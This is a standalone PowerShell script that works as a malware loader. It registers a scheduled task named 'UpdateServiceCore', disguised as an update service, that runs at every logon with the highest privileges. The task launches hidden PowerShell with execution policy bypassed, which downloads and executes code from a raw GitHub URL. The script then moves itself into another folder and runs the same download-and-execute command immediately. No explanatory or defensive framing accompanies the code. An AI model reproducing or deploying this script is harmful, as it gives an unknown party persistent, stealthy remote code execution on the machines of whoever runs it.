$scriptPath = $MyInvocation.MyCommand.Path
$currentDir = Split-Path $scriptPath -Parent
Set-Location $currentDir

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$otherFolders = Get-ChildItem -Directory | Where-Object { $_.Name -ne [System.IO.Path]::GetFileNameWithoutExtension($scriptPath) }

$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -StartWhenAvailable -AllowStartIfOnBatteries

Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "UpdateServiceCore" -Description "Runs script on logon" -Force -Settings $settings
Start-ScheduledTask -TaskName "UpdateServiceCore"

if ($otherFolders.Count -gt 0) {
    $targetFolder = $otherFolders[0].FullName
    $destinationPath = Join-Path $targetFolder (Split-Path $scriptPath -Leaf)
    Move-Item -Path $scriptPath -Destination $destinationPath -Force
    Set-Location $targetFolder
}

Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')"
exit
